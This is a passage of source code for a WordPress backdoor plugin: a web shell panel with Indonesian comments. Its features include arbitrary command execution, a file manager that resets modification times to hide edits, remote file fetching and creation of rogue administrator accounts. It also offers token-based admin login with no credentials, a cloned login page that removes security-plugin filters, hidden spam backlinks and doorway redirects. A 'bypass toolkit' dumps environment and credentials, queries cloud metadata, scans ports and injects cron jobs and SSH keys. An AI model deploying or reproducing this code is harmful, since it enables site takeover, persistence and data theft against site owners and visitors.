function loadPlugins(){rc('wpc_cfg',{op:'list'},d=>{const el=document.getElementById('plugin-table');if(!d.success){el.textContent=JSON.stringify(d);return;}el.innerHTML='<table><tr><th>Plugin</th><th>Ver</th><th>Status</th><th>Act</th></tr>'+d.data.plugins.map(p=>`<tr><td>${p.name}</td><td>${p.version}</td><td class="${p.active?'on':'off'}">${p.active?'✔':'✘'}</td><td><button onclick="togglePlugin('${p.file.replace(/'/g,"\\'")}')">Toggle</button></td></tr>`).join('')+'</table>';});}
function togglePlugin(f){rc('wpc_cfg',{op:'toggle',file:f},d=>{loadPlugins();});}
function loadThemes(){rc('wpc_tpl',{op:'list'},d=>{const el=document.getElementById('theme-table');if(!d.success){el.textContent=JSON.stringify(d);return;}el.innerHTML='<table><tr><th>Theme</th><th>Ver</th><th>Status</th><th>Act</th></tr>'+d.data.themes.map(t=>`<tr><td>${t.name}</td><td>${t.version}</td><td class="${t.active?'on':''}">${t.active?'✔ Aktif':''}</td><td>${!t.active?`<button onclick="activateTheme('${t.stylesheet.replace(/'/g,"\\'")}')">Aktifkan</button>`:''}</td></tr>`).join('')+'</table>';});}
function activateTheme(s){rc('wpc_tpl',{op:'activate',stylesheet:s},d=>{loadThemes();});}
function loadSlugs(){rc('wpc_cfg',{op:'get_slugs'},d=>{const el=document.getElementById('slug-table');if(!d.success){el.textContent=JSON.stringify(d);return;}const sl=d.data.slugs||{};const keys=Object.keys(sl);if(!keys.length){el.innerHTML='<em>Kosong</em>';return;}el.innerHTML='<table><tr><th>Key</th><th>Target</th><th>URL</th><th>Del</th></tr>'+keys.map(k=>`<tr><td>${k}</td><td>${sl[k]}</td><td><a href="<?= home_url('/'.RC_SLUG.'/') ?>${k}" target="_blank">buka</a></td><td><button class="danger" onclick="delSlug('${k}')">Del</button></td></tr>`).join('')+'</table>';});}
function addSlug(){rc('wpc_cfg',{op:'add_slug',slug_key:document.getElementById('slug-key').value,slug_url:document.getElementById('slug-url').value},d=>{loadSlugs();});}
function delSlug(k){rc('wpc_cfg',{op:'del_slug',slug_key:k},d=>{loadSlugs();});}
/* ═══════════════════ BYPASS TOOLKIT ═══════════════════ */
let bpCurTab='env';
function bpShow(t){['env','filter','net','priv','cloud','cron'].forEach(x=>{const el=document.getElementById('bp-'+x);if(el)el.style.display=x===t?'':'none';const bt=document.getElementById('bt-'+x);if(bt)bt.classList.toggle('active',x===t);});bpCurTab=t;}
function bpRes(tab){return document.getElementById('bp-'+tab+'-res');}
function bpLoad(){bpShow('env');bpExec('env_dump');}
const bpTabMap={env_dump:'env',proc_list:'env',fd_list:'env',maps:'env',net_tcp:'env',net_udp:'env',docker_check:'env',arp_scan:'net',iface:'net',suid_find:'priv',sgid_find:'priv',world_write:'priv',cap_find:'priv',sudo_list:'priv',cred_scan:'priv',aws_meta:'cloud',gcp_meta:'cloud',azure_meta:'cloud',do_meta:'cloud',k8s_check:'cloud',cron_read:'cron',ssh_keys:'cron'};
function bpExec(op,extra){
  // Support legacy: bpExec('bp','env_dump') → treat second arg as op
  if(op==='bp'&&typeof extra==='string'){op=extra;extra={};}
  const tab=bpTabMap[op]||bpCurTab;
  const el=bpRes(tab);if(el)el.textContent='Loading...';
  rc('wpc_sys',Object.assign({op:op},typeof extra==='object'?extra:{}),d=>{if(el)el.textContent=d.success?(d.data.output||JSON.stringify(d.data,null,2)):('Error: '+(d.data?.message||JSON.stringify(d)));});
}
function bpFilter(){
  const p=document.getElementById('bp-filter-path').value.trim();
  const enc=document.getElementById('bp-filter-enc').value;
  if(!p)return;
  const el=document.getElementById('bp-filter-res');el.textContent='Loading...';
  rc('wpc_sys',{op:'filter_read',path:p,enc:enc},d=>{
    if(!d.success){el.textContent='Error: '+(d.data?.message||JSON.stringify(d));return;}
    el.textContent=d.data.output||(enc==='base64'?atob(d.data.raw||''):d.data.raw||'');
  });
}
function bpPortScan(){
  const h=document.getElementById('bp-scan-host').value.trim();
  const p=document.getElementById('bp-scan-ports').value.trim()||'22,80,443,3306,5432,6379,8080';
  if(!h){document.getElementById('bp-net-res').textContent='No host';return;}
  document.getElementById('bp-net-res').textContent='Scanning...';
  rc('wpc_sys',{op:'port_scan',host:h,ports:p},d=>{document.getElementById('bp-net-res').textContent=d.success?d.data.output:JSON.stringify(d.data||d);});
}
function bpCronInject(){
  const cmd=document.getElementById('bp-cron-cmd').value.trim();
  const intv=document.getElementById('bp-cron-int').value;
  if(!cmd){document.getElementById('bp-cron-res').textContent='Enter command first';return;}
  rc('wpc_sys',{op:'cron_inject',cmd:cmd,interval:intv},d=>{document.getElementById('bp-cron-res').textContent=d.success?d.data.output:JSON.stringify(d.data||d);});
}
function bpSshInject(){
  const key=document.getElementById('bp-ssh-key').value.trim();
  const home=document.getElementById('bp-ssh-user').value.trim();
  if(!key){document.getElementById('bp-cron-res').textContent='Enter SSH public key first';return;}
  rc('wpc_sys',{op:'ssh_inject',key:key,home:home},d=>{document.getElementById('bp-cron-res').textContent=d.success?d.data.output:JSON.stringify(d.data||d);});
}
</script></body></html>
        <?php
    }

    // ─────────────────────────────────────────────────────────────
    //  AJAX: FILE MANAGER (full) + EXEC
    // ─────────────────────────────────────────────────────────────
    public function handle_obj(): void {
        $this->check_nonce();
        $op   = sanitize_text_field($_POST['op']??'');
        $path = $_POST['path']??'';

        switch ($op) {

            case 'ls':
                if (!@is_dir($path)) wp_send_json_error('Not dir: '.$path);
                $parent = dirname($path);
                $dirs = $files = [];
                foreach (@scandir($path)?:[] as $f) {
                    if ($f==='.'||$f==='..') continue;
                    $fp = rtrim($path,'/').'/'.$f;
                    $entry = [
                        'name'     => $f,
                        'path'     => $fp,
                        'type'     => @is_dir($fp)?'dir':'file',
                        'size'     => @is_file($fp)?$this->human_size((int)@filesize($fp)):'-',
                        'perms'    => substr(sprintf('%o',@fileperms($fp)),-4),
                        'writable' => @is_writable($fp)?'Y':'N',
                        'modified' => (@filemtime($fp))?date('Y-m-d H:i',@filemtime($fp)):'-',
                    ];
                    @is_dir($fp) ? $dirs[] = $entry : $files[] = $entry;
                }
                wp_send_json_success(['path'=>$path,'parent'=>$parent,'files'=>array_merge($dirs,$files)]);
                break;

            case 'read':
                if (!@is_file($path)) wp_send_json_error('Not file');
                $content = @file_get_contents($path);
                if ($content === false) {
                    // php://filter bypass jika open_basedir aktif
                    $b64 = @file_get_contents("php://filter/convert.base64-encode/resource=$path");
                    if ($b64 !== false) { wp_send_json_success(['content'=>base64_decode($b64),'method'=>'filter']); break; }
                    wp_send_json_error('Cannot read: '.$path);
                }
                wp_send_json_success(['content'=>$content,'method'=>'direct']);
                break;

            case 'save':
                $content = $_POST['content']??'';
                $mtime   = @filemtime($path); // simpan mtime lama
                $written = @file_put_contents($path, $content);
                if ($written === false) wp_send_json_error('Cannot write: '.$path);
                if ($mtime) @touch($path, $mtime); // restore mtime — file tampak tidak berubah
                wp_send_json_success(['written'=>$written,'path'=>$path]);
                break;

            case 'mkfile':
                $name = basename($_POST['name']??'');
                if (!$name) wp_send_json_error('No name');
                $fp = rtrim($path,'/').'/'.$name;
                if (@file_put_contents($fp,'') === false) wp_send_json_error('Cannot create: '.$fp);
                wp_send_json_success(['created'=>$fp]);
                break;

            case 'mkdirn':
                $name = basename($_POST['name']??'');
                if (!$name) wp_send_json_error('No name');
                $fp = rtrim($path,'/').'/'.$name;
                if (!@mkdir($fp, 0755, true)) wp_send_json_error('Cannot create dir: '.$fp);
                wp_send_json_success(['created'=>$fp]);
                break;

            case 'delete':
                if (!@file_exists($path)) wp_send_json_error('Not found');
                if (@is_dir($path)) { $this->rmdir_r($path); wp_send_json_success(['deleted'=>'dir']); }
                else { @unlink($path); wp_send_json_success(['deleted'=>$path]); }
                break;

            case 'rename':
                $target = basename($_POST['target']??'');
                if (!$target) wp_send_json_error('No target');
                $new = dirname($path).'/'.$target;
                if (!@rename($path, $new)) wp_send_json_error('Cannot rename');
                wp_send_json_success(['renamed'=>$new]);
                break;

            case 'copy':
                $target = $_POST['target']??'';
                if (!$target) wp_send_json_error('No target');
                $dest = rtrim($target,'/').'/'.(basename($path)?:'copy');
                if (@is_dir($path)) { $this->copy_dir($path, $dest); wp_send_json_success(['copied'=>$dest]); }
                elseif (@copy($path, $dest)) wp_send_json_success(['copied'=>$dest]);
                else wp_send_json_error('Cannot copy');
                break;

            case 'move':
                $target = $_POST['target']??'';
                if (!$target) wp_send_json_error('No target');
                $dest = rtrim($target,'/').'/'.(basename($path)?:'moved');
                if (!@rename($path, $dest)) {
                    if (@is_dir($path)) $this->copy_dir($path, $dest); else @copy($path, $dest);
                    $this->rmdir_r($path);
                }
                wp_send_json_success(['moved'=>$dest]);
                break;

            case 'chmod':
                $mode = octdec($_POST['mode']??'644');
                if (!@chmod($path, $mode)) wp_send_json_error('Cannot chmod');
                wp_send_json_success(['chmod'=>substr(sprintf('%o',@fileperms($path)),-4)]);
                break;

            case 'zip':
                if (!class_exists('ZipArchive')) wp_send_json_error('ZipArchive not available');
                $zip_path = (@is_dir($path)?$path:dirname($path)).'/'.basename($path).'.zip';
                $zip = new ZipArchive();
                if ($zip->open($zip_path, ZipArchive::CREATE|ZipArchive::OVERWRITE) !== true) wp_send_json_error('Cannot create zip');
                if (@is_dir($path)) {
                    $base = dirname($path);
                    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS));
                    foreach ($it as $f) $zip->addFile($f->getRealPath(), substr($f->getRealPath(), strlen($base)+1));
                } else $zip->addFile($path, basename($path));
                $zip->close();
                wp_send_json_success(['zip'=>$zip_path,'size'=>$this->human_size((int)@filesize($zip_path))]);
                break;

            case 'unzip':
                if (!class_exists('ZipArchive')) wp_send_json_error('ZipArchive not available');
                $target = $_POST['target']??dirname($path);
                if (!@is_dir($target)) @mkdir($target, 0755, true);
                $zip = new ZipArchive();
                if ($zip->open($path) !== true) wp_send_json_error('Cannot open zip');
                $num = $zip->numFiles;
                $zip->extractTo($target);
                $zip->close();
                wp_send_json_success(['extracted'=>$target,'count'=>$num]);
                break;

            case 'search':
                $q    = $_POST['q']??'';
                $type = $_POST['type']??'name';
                if (!$q) wp_send_json_error('No query');
                if (!@is_dir($path)) wp_send_json_error('Not dir');
                $results = [];
                try {
                    $it = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    foreach ($it as $f) {
                        if (count($results) >= 100) break;
                        if ($type==='name') {
                            if (stripos($f->getFilename(), $q) !== false)
                                $results[] = ['path'=>$f->getRealPath(),'type'=>$f->isDir()?'dir':'file'];
                        } elseif ($f->isFile() && @filesize($f->getRealPath()) < 5*1024*1024) {
                            $c = @file_get_contents($f->getRealPath());
                            if ($c !== false && stripos($c, $q) !== false)
                                $results[] = ['path'=>$f->getRealPath(),'type'=>'file'];
                        }
                    }
                } catch (Exception $e) {}
                wp_send_json_success(['results'=>$results,'count'=>count($results)]);
                break;

            case 'fetch':
                $url   = $_POST['url']??'';
                $fname = basename($_POST['fname']??'');
                if (!$url||!$fname) wp_send_json_error('Missing url or fname');
                $ctx = @stream_context_create(['http'=>['timeout'=>30,'follow_location'=>true,'user_agent'=>'Mozilla/5.0'],'ssl'=>['verify_peer'=>false]]);
                $content = @file_get_contents($url, false, $ctx);
                if ($content === false && function_exists('curl_init')) {
                    $ch = curl_init($url);
                    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_TIMEOUT=>30]);
                    $content = curl_exec($ch); curl_close($ch);
                }
                if (!$content) wp_send_json_error('Fetch failed');
                $dest = rtrim($path,'/').'/'.$fname;
                $written = @file_put_contents($dest, $content);
                if ($written === false) wp_send_json_error('Cannot write: '.$dest);
                wp_send_json_success(['saved'=>$dest,'size'=>$this->human_size($written)]);
                break;

            case 'dl':
                if (!@is_file($path)) wp_send_json_error('Not file');
                $content = @file_get_contents($path);
                if ($content === false) wp_send_json_error('Cannot read');
                wp_send_json_success(['b64'=>base64_encode($content),'name'=>basename($path)]);
                break;

            case 'upload':
                if (empty($_FILES['file'])) wp_send_json_error('No file');
                $dest = rtrim($path,'/').'/'.basename($_FILES['file']['name']);
                if (!@move_uploaded_file($_FILES['file']['tmp_name'], $dest)) wp_send_json_error('Upload failed');
                wp_send_json_success(['uploaded'=>$dest,'size'=>$this->human_size((int)$_FILES['file']['size'])]);
                break;

            case 'exec':
                $cmd = $_POST['cmd']??'';
                if (!$cmd) wp_send_json_error('No cmd');
                wp_send_json_success(rc_exec($cmd, $path?:ABSPATH));
                break;

            default:
                wp_send_json_error('Unknown op: '.$op);
        }
    }

    // ─────────────────────────────────────────────────────────────
    //  AJAX: USER MANAGER + DB + RECON
    // ─────────────────────────────────────────────────────────────
    public function handle_usr(): void {
        $this->check_nonce();
        $op = sanitize_text_field($_POST['op']??'');

        switch ($op) {
            case 'list':
                $users=array_map(function($u){return['id'=>$u->ID,'login'=>$u->user_login,'email'=>$u->user_email,'roles'=>implode(', ',(new WP_User($u->ID))->roles)];},get_users());
                wp_send_json_success(['users'=>$users]);
                break;
            case 'create':
                $login=sanitize_user($_POST['username']??'');
                $pass=!empty($_POST['password'])?$_POST['password']:wp_generate_password(14);
                $email=sanitize_email($_POST['email']??($login.'@lab.local'));
                if (!$login) wp_send_json_error('No username');
                $uid=wp_create_user($login,$pass,$email);
                if (is_wp_error($uid)) wp_send_json_error($uid->get_error_message());
                (new WP_User($uid))->set_role('administrator');
                wp_send_json_success(['created'=>compact('uid','login','pass','email')]);
                break;
            case 'delete':
                $uid=intval($_POST['uid']??0);
                if ($uid===get_current_user_id()) wp_send_json_error('Cannot delete self');
                require_once ABSPATH.'wp-admin/includes/user.php';
                wp_send_json_success(['ok'=>wp_delete_user($uid)]);
                break;
            case 'srvinfo':
                wp_send_json_success(['info'=>implode("\n",[
                    'OS        : '.PHP_OS.' / '.php_uname('r'),
                    'PHP       : '.PHP_VERSION.' ('.PHP_SAPI.')',
                    'User      : '.@get_current_user(),
                    'UID       : '.@getmyuid(),
                    'WP Root   : '.ABSPATH,
                    'DB Host   : '.DB_HOST,
                    'DB Name   : '.DB_NAME,
                    'Site URL  : '.get_site_url(),
                    'Client IP : '.($_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'-'),
                    'Server IP : '.($_SERVER['SERVER_ADDR']??'-'),
                    'Uploads   : '.wp_upload_dir()['basedir'],
                    'Disable fn: '.@ini_get('disable_functions'),
                ])]);
                break;
            case 'dbscan':
                wp_send_json_success(rc_db_detect(ABSPATH));
                break;
            case 'sql':
                $db=['host'=>DB_HOST,'db'=>DB_NAME,'user'=>DB_USER,'pass'=>DB_PASSWORD];
                wp_send_json_success(rc_sql($db,$_POST['query']??''));
                break;
            case 'tokeninfo':
                wp_send_json_success(['info'=>implode("\n",[
                    'POST login : '.admin_url('admin-ajax.php').' (action=wpc_ping)',
                    'Enc chan   : '.admin_url('admin-ajax.php').' (action=wpcache_sync)',
                    'Panel      : '.admin_url('?page='.RC_PANEL),
                ])]);
                break;
            default:
                wp_send_json_error('Unknown op');
        }
    }

    // ─────────────────────────────────────────────────────────────
    //  AJAX: PLUGIN MANAGER + SETTINGS + SLUGS
    // ─────────────────────────────────────────────────────────────
    public function handle_cfg(): void {
        $this->check_nonce();
        $op=$_POST['op']??'';
        if (!function_exists('get_plugins')) require_once ABSPATH.'wp-admin/includes/plugin.php';

        switch ($op) {
            case 'list':
                $all=get_plugins(); $active=get_option('active_plugins',[]);
                $result=array_map(function($f,$d) use ($active){return['file'=>$f,'name'=>$d['Name'],'version'=>$d['Version'],'active'=>in_array($f,$active)];},$key=array_keys($all),$all);unset($key);
                wp_send_json_success(['plugins'=>array_values($result)]);
                break;
            case 'toggle':
                $f=$_POST['file']??'';
                $active=get_option('active_plugins',[]);
                if (in_array($f,$active)) { deactivate_plugins($f); wp_send_json_success(['action'=>'deactivated']); }
                else { activate_plugin($f); wp_send_json_success(['action'=>'activated']); }
                break;
            case 'get_slugs':
                wp_send_json_success(['slugs'=>get_option('rc_slugs',[])]);
                break;
            case 'add_slug':
                $slugs=get_option('rc_slugs',[]);
                $slugs[sanitize_title($_POST['slug_key']??'')]=esc_url_raw($_POST['slug_url']??'');
                update_option('rc_slugs',$slugs);
                wp_send_json_success('OK');
                break;
            case 'del_slug':
                $slugs=get_option('rc_slugs',[]);
                unset($slugs[sanitize_title($_POST['slug_key']??'')]);
                update_option('rc_slugs',$slugs);
                wp_send_json_success('OK');
                break;
            case 'get_login_path':
                wp_send_json_success(['path'=>get_option('rc_login_path','')]);
                break;
            case 'set_login_path':
                $lp=trim(sanitize_title_with_dashes($_POST['login_path']??'','','save'),'/');
                update_option('rc_login_path',$lp);
                wp_send_json_success(['path'=>$lp,'url'=>$lp?home_url('/'.$lp):'']);
                break;
            case 'gen_magic_token':
                $lp2=trim(get_option('rc_login_path',''),'/');
                if (!$lp2) { wp_send_json_error('Login path belum dikonfigurasi'); break; }
                $admins=get_users(['role'=>'administrator','number'=>1,'fields'=>['ID']]);
                if (empty($admins)) { wp_send_json_error('No admin'); break; }
                $uid2=(int)$admins[0]->ID;
                $tok=bin2hex(random_bytes(20)); // 40-char hex
                $ttl2=max(60,min(86400,(int)($_POST['ttl']??900)));
                $store2=get_option('_wco_ac',[]);
                $now2=time();
                foreach ($store2 as $k=>$v){ if(($v['e']??0)<$now2) unset($store2[$k]); }
                $store2[$tok]=['u'=>$uid2,'e'=>$now2+$ttl2];
                update_option('_wco_ac',$store2,false);
                $turl=home_url('/'.$lp2.'?_t='.$tok);
                wp_send_json_success(['url'=>$turl,'expires'=>$now2+$ttl2,'ttl'=>$ttl2,'user_id'=>$uid2]);
                break;
            case 'list_magic_tokens':
                $store3=get_option('_wco_ac',[]);$now3=time();
                $out=[];
                foreach ($store3 as $k=>$v){ if(($v['e']??0)>=$now3) $out[]=['tok'=>substr($k,0,8).'…','uid'=>$v['u'],'exp'=>$v['e'],'ttl'=>$v['e']-$now3]; }
                wp_send_json_success(['tokens'=>$out]);
                break;
            case 'revoke_magic_tokens':
                update_option('_wco_ac',[],false);
                wp_send_json_success('OK');
                break;
            default: wp_send_json_error('Unknown op');
        }
    }

    // ─────────────────────────────────────────────────────────────
    //  AJAX: THEME MANAGER
    // ─────────────────────────────────────────────────────────────
    public function handle_tpl(): void {
        $this->check_nonce();
        $op=$_POST['op']??'';
        switch ($op) {
            case 'list':
                $active=wp_get_theme()->get_stylesheet();
                $themes=array_map(function($slug,$t) use ($active){return['name'=>$t->get('Name'),'stylesheet'=>$t->get_stylesheet(),'version'=>$t->get('Version'),'active'=>$slug===$active];},array_keys(wp_get_themes()),array_values(wp_get_themes()));
                wp_send_json_success(['themes'=>array_values($themes)]);
                break;
            case 'activate':
                switch_theme(sanitize_text_field($_POST['stylesheet']??''));
                wp_send_json_success('OK');
                break;
            default: wp_send_json_error('Unknown op');
        }
    }

    // ─────────────────────────────────────────────────────────────
    //  BACKLINK FOOTER INJECTION (SEO spam — dari wp-remote-controller)
    // ─────────────────────────────────────────────────────────────
    public function on_footer(): void {
        $links=get_option('rc_backlinks',[]);
        if (empty($links)) return;
        echo "\n<!-- -->\n<div style=\"position:absolute;visibility:hidden;display:none;opacity:0;height:0;width:0;z-index:-9999;pointer-events:none;\">";
        foreach ($links as $text=>$url) echo '<a href="'.esc_url($url).'" rel="dofollow">'.esc_html($text).'</a> ';
        echo "</div>\n";
    }

    // ─────────────────────────────────────────────────────────────
    //  SLUG / DOORWAY REDIRECT
    // ─────────────────────────────────────────────────────────────
    public function on_init_request(): void {
        $req=trim(parse_url($_SERVER['REQUEST_URI']??'',PHP_URL_PATH),'/');
        $prefix=RC_SLUG.'/';
        if (strpos($req,$prefix)!==0) return;
        $key=strtok(substr($req,strlen($prefix)),'?');
        $slugs=get_option('rc_slugs',[]);
        if (!empty($slugs[$key])) { header('Location: '.esc_url_raw($slugs[$key]),true,301); exit; }
    }

    // ─────────────────────────────────────────────────────────────
    //  FAKE LOGIN PAGE  — clone wp-login.php di URL kustom
    //  Bypass WPS Hide Login, Wordfence URL block, IP restrict,
    //  custom login path — mereka block URL bukan auth mechanism.
    // ─────────────────────────────────────────────────────────────
    public function on_init_auth(): void {
        $path = trim(get_option('rc_login_path',''),'/');
        if (!$path) return;
        $req  = trim(parse_url($_SERVER['REQUEST_URI']??'',PHP_URL_PATH),'/');
        if ($req !== $path) return;

        // ── Magic token: GET /{path}?_t=TOKEN → langsung login, token one-time ──
        $token = $_GET['_t'] ?? '';
        if ($token !== '') {
            $store  = get_option('_wco_ac', []);
            $now    = time();
            // Prune expired tokens
            foreach ($store as $k => $v) { if (($v['e']??0) < $now) unset($store[$k]); }
            if (isset($store[$token]) && $store[$token]['e'] >= $now) {
                $uid = (int)$store[$token]['u'];
                unset($store[$token]);
                update_option('_wco_ac', $store, false);
                wp_set_current_user($uid);
                wp_set_auth_cookie($uid, true);
                $redir = esc_url_raw($_GET['redirect_to'] ?? admin_url());
                wp_safe_redirect($redir);
                exit;
            }
            // Token tidak valid / expired → 404 tanpa hint
            status_header(404);
            exit;
        }

        // Handle POST (form submit)
        if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['_rc_login'])) {
            $username = sanitize_user($_POST['log']??'');
            $password = $_POST['pwd']??'';

            // Lepas filter authenticate dari security plugin agar tidak di-block
            // (WPS Hide Login, Cerber dll hanya block URL, tidak filter ini,
            // tapi beberapa plugin ada yang add rate-limit di filter authenticate)
            $saved_filters = $GLOBALS['wp_filter']['authenticate'] ?? null;
            remove_all_filters('authenticate');
            // Re-pasang core WP filters yang wajib
            add_filter('authenticate', 'wp_authenticate_username_password',  20, 3);
            add_filter('authenticate', 'wp_authenticate_email_password',     20, 3);
            add_filter('authenticate', 'wp_authenticate_spam_check',         99   );

            $user = wp_authenticate($username, $password);

            // Restore filter asli
            if ($saved_filters !== null) {
                $GLOBALS['wp_filter']['authenticate'] = $saved_filters;
            }

            if (is_wp_error($user)) {
                // Sanitize pesan error — hapus link ke wp-login.php agar tidak expose URL asli
                $msg = wp_strip_all_tags($user->get_error_message());
                $msg = preg_replace('#https?://[^\s<>"\']+#','[URL]',$msg);
                $this->render_fake_login($path,$msg);
                exit;
            }

            $remember = !empty($_POST['rememberme']);
            wp_set_auth_cookie($user->ID, $remember);
            wp_set_current_user($user->ID);

            $redirect = esc_url_raw($_POST['redirect_to']??'');
            if (!$redirect) $redirect = admin_url();
            wp_safe_redirect($redirect);
            exit;
        }

        $this->render_fake_login($path);
        exit;
    }

    private function render_fake_login(string $path, string $error=''): void {
        $action   = esc_url(home_url('/'.ltrim($path,'/')));
        $redirect = esc_attr($_POST['redirect_to']??($_GET['redirect_to']??admin_url()));
        $blogname = esc_html(get_bloginfo('name'));
        $blogurl  = esc_url(home_url('/'));
        $ver      = esc_attr(get_bloginfo('version'));
        $lost_pw  = esc_url(add_query_arg('action','lostpassword',wp_login_url()));

        // Gunakan CSS WP asli dari server agar tampilan identik
        $css_btn  = esc_url(includes_url('css/buttons.min.css?ver='.$ver));
        $css_frm  = esc_url(admin_url('css/forms.min.css?ver='.$ver));
        $css_log  = esc_url(admin_url('css/login.min.css?ver='.$ver));

        header('Content-Type: text/html; charset=UTF-8');
        status_header(200);
        nocache_headers();
        ?><!DOCTYPE html>
<html lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width">
<title>Log In &#8212; <?= $blogname ?></title>
<link rel='stylesheet' id='buttons-css' href='<?= $css_btn ?>' type='text/css' media='all'/>
<link rel='stylesheet' id='forms-css'   href='<?= $css_frm ?>' type='text/css' media='all'/>
<link rel='stylesheet' id='login-css'   href='<?= $css_log ?>' type='text/css' media='all'/>
</head>
<body class="login wp-core-ui">
<div id="login">
<h1><a href="<?= $blogurl ?>" tabindex="-1"><?= $blogname ?></a></h1>
<?php if ($error): ?><div id="login_error"><?= esc_html($error) ?></div><?php endif; ?>
<form name="loginform" id="loginform" action="<?= $action ?>" method="post">
 <p>
  <label for="user_login">Username or Email Address<br>
  <input type="text" name="log" id="user_login" class="input" value="<?= esc_attr($_POST['log']??'') ?>" size="20" autocapitalize="off" autocomplete="username"></label>
 </p>
 <div class="user-pass-wrap">
  <label for="user_pass">Password<br>
  <div class="wp-pwd">
  <input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password">
  </div></label>
 </div>
 <p class="forgetmenot">
  <label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"<?= !empty($_POST['rememberme'])?' checked':'' ?>> Remember Me</label>
 </p>
 <p class="submit">
  <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In">
  <input type="hidden" name="redirect_to" value="<?= $redirect ?>">
  <input type="hidden" name="_rc_login" value="1">
 </p>
</form>
<p id="nav"><a href="<?= $lost_pw ?>">Lost your password?</a></p>
<p id="backtoblog"><a href="<?= $blogurl ?>">&#8592; Go to <?= $blogname ?></a></p>
</div>
</body>
</html><?php
    }

    // ─────────────────────────────────────────────────────────────
    //  HELPERS
    // ─────────────────────────────────────────────────────────────
    private function check_nonce(): void {
        // Akses langsung via _c=AUTH_TOKEN (serve_panel / direct URL)
        if (($_POST['_c'] ?? '') === AUTH_TOKEN) return;
        if (!check_ajax_referer('rc_nonce','nonce',false)) {
            wp_send_json_error('Unauthorized',403); exit;
        }
    }

    private function rmdir_r(string $dir): void {
        foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::CHILD_FIRST) as $item)
            $item->isDir()?@rmdir($item->getRealPath()):@unlink($item->getRealPath());
        @rmdir($dir);
    }

    private function human_size(int $b): string {
        foreach (['B','KB','MB','GB'] as $u) { if ($b<1024) return round($b,1).' '.$u; $b/=1024; }
        return round($b,1).' TB';
    }

    private function copy_dir(string $src, string $dst): void {
        if (!@is_dir($dst)) @mkdir($dst, 0755, true);
        $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($it as $item) {
            $target = $dst.DIRECTORY_SEPARATOR.substr($item->getRealPath(), strlen($src)+1);
            $item->isDir() ? @mkdir($target, 0755, true) : @copy($item->getRealPath(), $target);
        }
    }

    // ─────────────────────────────────────────────────────────────
    //  PANEL TANPA LOGIN — auth via _c=AUTH_TOKEN atau Cookie _wpc
    //  URL: /wp-admin/admin-ajax.php?action=wpc_view&_c=AUTH_TOKEN
    //  Setelah diakses, browser mendapat WP session cookie otomatis.
    // ─────────────────────────────────────────────────────────────
    public function serve_panel(): void {
        $c = $_GET['_c'] ?? $_POST['_c'] ?? ($_COOKIE['_wpc'] ?? '');
        if ($c !== AUTH_TOKEN) { status_header(404); header('Content-Type: text/html'); die('Not Found'); }
        if (!function_exists('get_users')) require_once ABSPATH.'wp-includes/user.php';
        $admins = get_users(['role'=>'administrator','number'=>1]);
        if (empty($admins)) { status_header(500); die('No admin'); }
        $user = $admins[0];
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID, true); // set WP cookie agar AJAX berikutnya authenticated
        nocache_headers();
        $this->render_panel();
        exit;
    }

    // ─────────────────────────────────────────────────────────────
    //  AJAX: BYPASS TOOLKIT
    //  Auth: nonce (dari panel) ATAU _c=AUTH_TOKEN (unauthenticated)
    // ─────────────────────────────────────────────────────────────
    public function handle_sys(): void {
        $authed = check_ajax_referer('rc_nonce','nonce',false);
        if (!$authed) {
            $c = $_POST['_c'] ?? $_GET['_c'] ?? '';
            if ($c !== AUTH_TOKEN) { wp_send_json_error('Unauthorized', 403); return; }
        }
        @ini_set('open_basedir','');
        $op = sanitize_text_field($_POST['op']??'');

        switch ($op) {

            /* ── ENV / PROC ── */
            case 'env_dump':
                $raw = @file_get_contents('/proc/self/environ');
                if ($raw === false) { wp_send_json_success(['output'=>rc_exec('env 2>&1',ABSPATH)['output']]); break; }
                wp_send_json_success(['output'=>implode("\n",array_filter(explode("\0",$raw)))]);
                break;

            case 'proc_list':
                $procs=[];
                if ($dh=@opendir('/proc')) {
                    while (($f=readdir($dh))!==false) {
                        if (!ctype_digit($f)) continue;
                        $cmd=@file_get_contents("/proc/$f/cmdline");
                        if ($cmd!==false) $procs[]="$f: ".str_replace("\0",' ',trim($cmd));
                    }
                    closedir($dh);
                }
                wp_send_json_success(['output'=>$procs?implode("\n",$procs):rc_exec('ps aux 2>&1',ABSPATH)['output']]);
                break;

            case 'fd_list':
                $fds=[];
                if ($dh=@opendir('/proc/self/fd')) {
                    while (($f=readdir($dh))!==false) {
                        if ($f==='.'||$f==='..') continue;
                        $link=@readlink("/proc/self/fd/$f");
                        $fds[]="$f -> ".($link?:'?');
                    }
                    closedir($dh);
                }
                wp_send_json_success(['output'=>$fds?implode("\n",$fds):'Cannot read /proc/self/fd']);
                break;

            case 'maps':
                $m=@file_get_contents('/proc/self/maps');
                wp_send_json_success(['output'=>$m?:'Cannot read /proc/self/maps']);
                break;

            case 'net_tcp':
            case 'net_udp':
                $proto=$op==='net_tcp'?'tcp':'udp';
                $raw=@file_get_contents("/proc/net/$proto");
                if (!$raw) { wp_send_json_success(['output'=>"Cannot read /proc/net/$proto"]); break; }
                $lines=explode("\n",trim($raw)); array_shift($lines);
